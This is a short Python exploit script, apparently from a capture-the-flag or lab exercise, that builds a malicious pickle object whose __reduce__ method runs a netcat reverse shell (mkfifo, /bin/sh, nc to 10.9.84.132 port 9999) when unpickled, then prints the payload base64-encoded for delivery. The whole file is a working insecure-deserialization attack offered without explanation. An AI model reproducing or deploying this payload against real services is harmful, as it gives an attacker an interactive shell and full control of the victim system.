import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 10.9.84.132 9999 > /tmp/f')
        return os.system, (cmd,)
        # return os.system, ('ls',)


pickled = pickle.dumps(RCE())
s = base64.b64encode(pickled)
print(s.decode())

# import pickle
# pickle.loads(base64.b64decode(s))